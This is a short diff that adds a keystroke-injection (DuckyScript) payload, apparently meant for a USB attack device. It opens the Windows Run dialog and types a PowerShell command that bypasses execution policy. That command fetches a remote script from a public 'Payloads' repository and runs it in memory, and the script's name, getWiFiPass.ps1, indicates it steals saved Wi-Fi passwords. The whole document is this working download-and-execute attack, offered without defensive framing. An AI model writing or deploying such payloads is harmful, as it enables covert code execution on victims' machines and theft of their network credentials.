@@ -1,0 +1,6 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/muratcx/Payloads/main/getWiFiPass.ps1' -UseBasicParsing).Content
+DELAY 500
+ENTER
